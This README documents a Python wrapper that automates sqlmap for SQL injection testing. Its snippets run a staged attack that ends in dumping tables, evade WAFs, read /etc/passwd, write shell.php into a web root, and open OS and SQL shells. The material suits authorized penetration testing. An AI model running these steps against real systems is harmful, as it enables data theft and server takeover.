# SQLMap Integration Module

## Overview

The `sqlmap_integration.py` module provides a comprehensive Python API for automating SQL injection exploitation using sqlmap. It bridges the gap between Python code and the sqlmap command-line tool, enabling seamless integration into automated testing workflows.

## Features

✅ **Raw HTTP Request Support**
- Accept GET/POST requests with headers, cookies, and payloads
- Save requests to temp files for sqlmap's `-r` option
- Support for raw HTTP request strings (e.g., from Burp Suite)

✅ **Comprehensive Configuration**
- Verbosity levels (0-6)
- Risk levels (1-3)
- Test levels (1-5)
- Proxy support with authentication
- Thread configuration
- Timeout and retry settings
- Tamper script support
- Custom user agents

✅ **Database Enumeration**
- Test for SQL injection vulnerabilities
- Enumerate databases
- Enumerate tables in databases
- Enumerate columns in tables
- Dump data from tables

✅ **High-Level Orchestration**
- Automated multi-stage attack workflow
- Walks through typical exploitation steps:
  1. Test for vulnerability
  2. Enumerate databases
  3. Enumerate tables
  4. Enumerate columns
  5. Dump data
- Intelligent target selection (avoids system databases)
- Error handling and progress tracking

✅ **Extensibility**
- Custom sqlmap command options
- Easy integration with other Megido modules
- Modular design for future enhancements
- Support for advanced exploitation techniques

✅ **Result Parsing**
- Parse sqlmap output for structured data
- Extract databases, tables, columns
- Track vulnerability status
- Capture console output and errors
- Session and log file management

## Installation

### Prerequisites

1. **Python 3.7+** (included in Megido)
2. **sqlmap** - Install using one of these methods:

```bash
# Method 1: Using pip
pip install sqlmap-tool

# Method 2: From GitHub
git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git
cd sqlmap
ln -s $(pwd)/sqlmap.py /usr/local/bin/sqlmap

# Method 3: Using package manager (Ubuntu/Debian)
sudo apt-get install sqlmap

# Method 4: Using package manager (macOS)
brew install sqlmap
```

Verify installation:
```bash
sqlmap --version
```

### Module Installation

The module is already included in Megido. No additional installation required.

## Quick Start

### Basic Usage

```python
from sql_attacker.sqlmap_integration import create_attacker, HTTPRequest

# Create an attacker instance
attacker = create_attacker(risk=1, level=1, verbosity=1)

# Create an HTTP request
request = HTTPRequest(
    url="http://example.com/page?id=1",
    method="GET"
)

# Test for SQL injection
result = attacker.test_injection(request)

if result.vulnerable:
    print("Vulnerability found!")
    print(f"Output: {result.output}")
```

### POST Request with Data

```python
from sql_attacker.sqlmap_integration import SQLMapAttacker, SQLMapConfig, HTTPRequest, SQLMapRiskLevel, SQLMapLevel

# Configure attacker
config = SQLMapConfig(
    risk=SQLMapRiskLevel.MEDIUM,
    level=SQLMapLevel.INTERMEDIATE,
    verbosity=2
)
attacker = SQLMapAttacker(config=config)

# Create POST request
request = HTTPRequest(
    url="http://example.com/login.php",
    method="POST",
    headers={"Content-Type": "application/x-www-form-urlencoded"},
    cookies={"sessionid": "abc123"},
    data={"username": "admin", "password": "test"}
)

# Test injection
result = attacker.test_injection(request)
```

### Using Raw HTTP Request

```python
from sql_attacker.sqlmap_integration import create_attacker, HTTPRequest

attacker = create_attacker()

# Copy-paste raw request from Burp Suite or proxy
raw_request = """POST /login.php HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded
Cookie: session=xyz

username=admin&password=test"""

request = HTTPRequest(
    url="http://example.com/login.php",
    raw_request=raw_request
)

result = attacker.test_injection(request)
```

### Database Enumeration Workflow

```python
from sql_attacker.sqlmap_integration import create_attacker, HTTPRequest

attacker = create_attacker(risk=2, level=2)
request = HTTPRequest(url="http://example.com/page?id=1")

# Step 1: Test vulnerability
result = attacker.test_injection(request)
if not result.vulnerable:
    print("Not vulnerable")
    exit()

# Step 2: Enumerate databases
db_result = attacker.enumerate_databases(request)
print(f"Databases: {db_result.databases}")

# Step 3: Enumerate tables
table_result = attacker.enumerate_tables(request, "targetdb")
print(f"Tables: {table_result.tables}")

# Step 4: Enumerate columns
col_result = attacker.enumerate_columns(request, "targetdb", "users")

# Step 5: Dump data
dump_result = attacker.dump_table(request, "targetdb", "users")
```

### Orchestrated Attack (Automated)

```python
from sql_attacker.sqlmap_integration import SQLMapAttacker, SQLMapConfig, HTTPRequest, SQLMapRiskLevel, SQLMapLevel

# Configure for aggressive testing
config = SQLMapConfig(
    risk=SQLMapRiskLevel.HIGH,
    level=SQLMapLevel.EXTENSIVE,
    verbosity=2,
    threads=4,
    random_agent=True
)
attacker = SQLMapAttacker(config=config)

request = HTTPRequest(url="http://example.com/page?id=1")

# Run automated multi-stage attack
results = attacker.orchestrate_attack(request)

# Check results
print(f"Success: {results['success']}")
print(f"Stages completed: {results['stages_completed']}")
print(f"Databases: {results['databases']}")
print(f"Tables: {results['tables']}")
print(f"Errors: {results['errors']}")
```

### Using Proxy (Burp Suite Integration)

```python
from sql_attacker.sqlmap_integration import SQLMapConfig, SQLMapAttacker, HTTPRequest

# Configure to use Burp Suite
config = SQLMapConfig(
    proxy="http://127.0.0.1:8080",  # Burp Suite default
    verbosity=1
)
attacker = SQLMapAttacker(config=config)

request = HTTPRequest(url="http://example.com/api?id=1")
result = attacker.test_injection(request)

# All traffic will go through Burp Suite for inspection
```

### Custom SQLMap Options

```python
from sql_attacker.sqlmap_integration import SQLMapConfig, SQLMapAttacker, HTTPRequest

# Advanced configuration
config = SQLMapConfig(
    technique="BEUST",  # Boolean, Error, Union, Stacked, Time
    dbms="MySQL",
    tamper=["space2comment", "between"],  # WAF bypass
    delay=2,  # Delay between requests
    extra_args=["--no-cast", "--hex"]
)
attacker = SQLMapAttacker(config=config)

request = HTTPRequest(url="http://example.com/page?id=1")
result = attacker.test_injection(request)

# Or use custom commands directly
result = attacker.execute_custom_command(
    request,
    extra_options=["--os-shell", "--sql-shell"]
)
```

## API Reference

### Classes

#### `SQLMapConfig`
Configuration for SQLMap execution.

**Parameters:**
- `risk`: Risk level (LOW=1, MEDIUM=2, HIGH=3)
- `level`: Test level (MINIMAL=1 to COMPREHENSIVE=5)
- `verbosity`: Output verbosity (0-6)
- `threads`: Number of threads (default: 1)
- `timeout`: Request timeout in seconds (default: 30)
- `proxy`: Proxy URL (e.g., "http://127.0.0.1:8080")
- `technique`: SQL injection techniques to use (e.g., "BEUST")
- `dbms`: Target DBMS (mysql, mssql, oracle, postgresql, etc.)
- `tamper`: List of tamper scripts for WAF bypass
- `output_dir`: Directory for output files
- `batch`: Never ask for user input (default: True)
- `extra_args`: Additional command line arguments

#### `HTTPRequest`
Represents an HTTP request for testing.

**Parameters:**
- `url`: Target URL
- `method`: HTTP method (GET, POST, etc.)
- `headers`: Dictionary of HTTP headers
- `cookies`: Dictionary of cookies
- `data`: POST data dictionary
- `raw_request`: Raw HTTP request string (optional)

#### `SQLMapAttacker`
Main class for SQLMap integration.

**Methods:**
- `test_injection(request)`: Test for SQL injection vulnerability
- `enumerate_databases(request)`: Enumerate available databases
- `enumerate_tables(request, database)`: Enumerate tables in database
- `enumerate_columns(request, database, table)`: Enumerate columns in table
- `dump_table(request, database, table)`: Dump data from table
- `orchestrate_attack(request, target_database, target_tables)`: Run automated attack
- `execute_custom_command(request, extra_options)`: Execute custom sqlmap command

#### `SQLMapResult`
Result object containing attack results.

**Attributes:**
- `success`: Whether execution succeeded
- `vulnerable`: Whether vulnerability was found
- `databases`: List of discovered databases
- `tables`: Dictionary of database->tables
- `columns`: Dictionary of database->table->columns
- `dumped_data`: Dumped data
- `output`: Full stdout from sqlmap
- `error`: Error message if any

### Functions

#### `create_attacker(risk, level, verbosity, proxy)`
Convenience function to create a SQLMapAttacker instance.

**Parameters:**
- `risk`: Risk level (1-3)
- `level`: Test level (1-5)
- `verbosity`: Verbosity level (0-6)
- `proxy`: Optional proxy URL

**Returns:**
- Configured `SQLMapAttacker` instance

## Examples

See the following files for detailed examples:
- `demo_sqlmap_integration.py` - Comprehensive usage examples
- `test_sqlmap_integration.py` - Unit tests with examples

Run the demo:
```bash
python3 sql_attacker/demo_sqlmap_integration.py
```

Run the tests:
```bash
python3 sql_attacker/test_sqlmap_integration.py
```

## Integration with Megido

### With SQL Injection Engine

```python
from sql_attacker.sqli_engine import SQLInjectionEngine
from sql_attacker.sqlmap_integration import create_attacker, HTTPRequest

# Use native engine for fast detection
engine = SQLInjectionEngine()
vulnerabilities = engine.detect_vulnerabilities(url, params)

# Use sqlmap for deep exploitation
if vulnerabilities:
    attacker = create_attacker(risk=2, level=3)
    request = HTTPRequest(url=url)
    results = attacker.orchestrate_attack(request)
```

### With Browser/Proxy

```python
# Capture request from proxy, then exploit with sqlmap
from sql_attacker.sqlmap_integration import create_attacker, HTTPRequest

# Request captured from Megido proxy
captured_request = proxy.get_request()

request = HTTPRequest(
    url=captured_request['url'],
    method=captured_request['method'],
    headers=captured_request['headers'],
    data=captured_request['data']
)

attacker = create_attacker()
result = attacker.orchestrate_attack(request)
```

## Advanced Features

### WAF Bypass

```python
from sql_attacker.sqlmap_integration import SQLMapConfig, SQLMapAttacker, HTTPRequest

config = SQLMapConfig(
    tamper=[
        "space2comment",    # Replace space with /**/ comment
        "between",          # Replace > with BETWEEN
        "charencode",       # URL-encode characters
        "randomcase",       # Random case for keywords
    ],
    delay=3,  # Slow down to avoid detection
    random_agent=True
)
attacker = SQLMapAttacker(config=config)
```

### File Operations

```python
# Read files from server
result = attacker.execute_custom_command(
    request,
    ["--file-read", "/etc/passwd"]
)

# Write files to server
result = attacker.execute_custom_command(
    request,
    ["--file-write", "shell.php", "--file-dest", "/var/www/html/shell.php"]
)
```

### OS Command Execution

```python
# Execute OS commands
result = attacker.execute_custom_command(
    request,
    ["--os-cmd", "whoami"]
)

# Interactive OS shell
result = attacker.execute_custom_command(
    request,
    ["--os-shell"]
)
```

### SQL Shell

```python
# Interactive SQL shell
result = attacker.execute_custom_command(
    request,
    ["--sql-shell"]
)
```

## Best Practices

1. **Always get authorization** before testing
2. **Start with low risk/level** and increase if needed
3. **Use proxy** for debugging and inspection
4. **Monitor output** for errors and warnings
5. **Clean up** temporary files after use
6. **Respect rate limits** with delay settings
7. **Use batch mode** for automation
8. **Parse results** programmatically instead of manually

## Troubleshooting

### SQLMap Not Found

```bash
# Check if sqlmap is in PATH
which sqlmap

# If not, install or specify full path
attacker = SQLMapAttacker(sqlmap_path="/path/to/sqlmap.py")
```

### Permission Denied

```bash
# Make sqlmap executable
chmod +x /path/to/sqlmap.py
```

### Timeout Issues

```python
# Increase timeout
config = SQLMapConfig(timeout=60, retries=5)
```

### Proxy Issues

```python
# Disable SSL verification if needed
config = SQLMapConfig(
    proxy="http://127.0.0.1:8080",
    extra_args=["--skip-urlencode"]
)
```

## Limitations

- Requires sqlmap to be installed separately
- Subprocess execution overhead
- Output parsing is simplified (may miss some details)
- Real-time interaction limited (use for batch operations)

## Future Enhancements

- [ ] Enhanced output parsing with regex
- [ ] Support for sqlmap API mode
- [ ] Integration with other tools (e.g., nuclei, nikto)
- [ ] Advanced payload generation
- [ ] Machine learning for attack optimization
- [ ] Real-time progress monitoring
- [ ] Session management and resumption

## Contributing

Contributions are welcome! Please follow the existing code style and include tests for new features.

## License

Part of the Megido project. See main repository for license information.

## References

- [SQLMap Documentation](https://github.com/sqlmapproject/sqlmap/wiki)
- [SQL Injection Techniques](https://owasp.org/www-community/attacks/SQL_Injection)
- [Web Application Hacker's Handbook](https://www.wiley.com/en-us/The+Web+Application+Hacker%27s+Handbook%3A+Finding+and+Exploiting+Security+Flaws%2C+2nd+Edition-p-9781118026472)

## Support

For issues, questions, or suggestions, please open an issue in the Megido repository.
